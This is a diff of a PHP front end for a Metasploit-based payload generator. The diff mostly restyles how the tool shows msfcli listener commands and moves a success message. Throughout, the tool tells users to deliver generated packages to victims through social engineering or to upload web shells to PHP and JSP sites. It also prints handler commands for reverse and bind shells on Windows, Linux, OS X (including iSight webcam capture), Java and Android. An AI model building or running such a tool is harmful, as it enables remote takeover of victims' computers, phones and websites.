@@ -75,7 +75,7 @@ echo '<b>Note:</b>You can send this package to victim by any social engineering 
 
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
 
                        
              
@@ -101,7 +101,7 @@ echo '<b>Note:</b>You can send this package to victim by any social engineering 
 
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD=windows/shell_reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
 
                     
                         break;
@@ -127,7 +127,7 @@ echo '<b>Note:</b>You can send this package to victim by any social engineering 
 
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
 
                     
                         
@@ -153,7 +153,7 @@ echo '<b>Note:</b>You can send this package to victim by any social engineering 
 
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
 
                     
                         break;
@@ -176,7 +176,7 @@ echo '<b>Note:</b>You can send this package to victim by any social engineering 
 
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD=linux/x86/meterpreter/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
 
                         break;
                      case c6:
@@ -199,7 +199,7 @@ echo '<b>Note:</b>You can send this package to victim by any social engineering 
 
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD=linux/x86/shell_reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD=linux/x86/shell_reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
 
                         break;
                     
@@ -225,7 +225,7 @@ echo '<b>Note:</b>You can send this package to victim by any social engineering 
 
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD=osx/x86/shell_reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
 
                         
                         break;
@@ -250,7 +250,7 @@ echo '<b>Note:</b>You can send this package to victim by any social engineering 
 
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD=osx/x86/isight/bind_tcp LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD=osx/x86/isight/bind_tcp LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
 
                         
                         break;
@@ -275,7 +275,7 @@ echo '<b>Note:</b>You can send this package to victim by any social engineering 
 
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD=java/meterpreter/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD=java/meterpreter/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
 
                            
                         
@@ -300,7 +300,7 @@ echo '<b>Note:</b>You can send this package to victim by any social engineering 
 
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD=java/shell/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD=java/shell/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
 
                            
                         
@@ -323,7 +323,7 @@ echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Apple osx,Linux,Windows,Android</p>
 echo'<p>*****************************************************************************</p>';
 echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD=java/shell/bind_tcp LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD=java/shell/bind_tcp LHOST='.$ip.' LPORT='.$port.' E </b><code>'; 
 
                            
                         break;
@@ -346,7 +346,7 @@ echo '<p><b>AFFECTED SYSTEMS ARE</b>      -->Websites(php)</p>';
 echo'<p>*****************************************************************************</p>';
 echo '<b>Note:</b> Upload this shell on website supporting PHP and start meterpreter listener ';
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD=php/meterpreter/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD=php/meterpreter/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
                         break;
                     
                     case c14:
@@ -367,7 +367,7 @@ echo'<p>************************************************************************
 echo '<b>Note:</b> Upload this shell on website supporting PHP and start meterpreter listener ';
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD=windows/meterpreter/reverse_tcp LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
                         break;
                     case c15:
                          shell("echo '[Wait] While i generate your $pkg.jsp payload..........'");
@@ -388,7 +388,7 @@ echo'<p>************************************************************************
 echo '<b>Note:</b> Upload this shell on website supporting JSP and start meterpreter listener ';
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli exploit/multi/handler PAYLOAD=java/jsp_shell_reverse_tcp   LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli exploit/multi/handler PAYLOAD=java/jsp_shell_reverse_tcp   LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
                
                         break;
                     case c16:
@@ -408,7 +408,7 @@ echo'<p>************************************************************************
 echo '<b>Note:</b>You can send this package to victim by any social engineering techniques ';
 
 echo '<p><b>To start listener copy and paste this code in to your terminal:</b></p>';
-echo 'sudo msfcli multi/handler PAYLOAD=android/meterpreter/reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E'; 
+echo '<code style="float:top;backface-visibility: visible;background-color:#BBB7B7;color:#5A7359"><b>sudo msfcli multi/handler PAYLOAD=android/meterpreter/reverse_tcp  LHOST='.$ip.' LPORT='.$port.' E </b></code>'; 
                         break;
                     
                 }
@@ -417,7 +417,9 @@ echo 'sudo msfcli multi/handler PAYLOAD=android/meterpreter/reverse_tcp  LHOST='
                         
                 
  }
-                 
+     echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : '".$pkg. ".exe Generated Successfully ! Please refer result section after this message'});</script>";
+        
+                    
          echo '</div>
                                     <footer>
 				<div align="left">
@@ -430,9 +432,7 @@ echo 'sudo msfcli multi/handler PAYLOAD=android/meterpreter/reverse_tcp  LHOST='
                  <h4 class="alert_success">Succeeded </h4>
                  
  ';
-          echo "<script type='text/javascript'>$.msg({ fadeIn : 500,fadeOut : 500, bgPath : 'dlgs/',  content : '".$pkg. "Generated Successfully!Please refer result section after this message'});</script>";
-        
-        
+          
          
          
  }
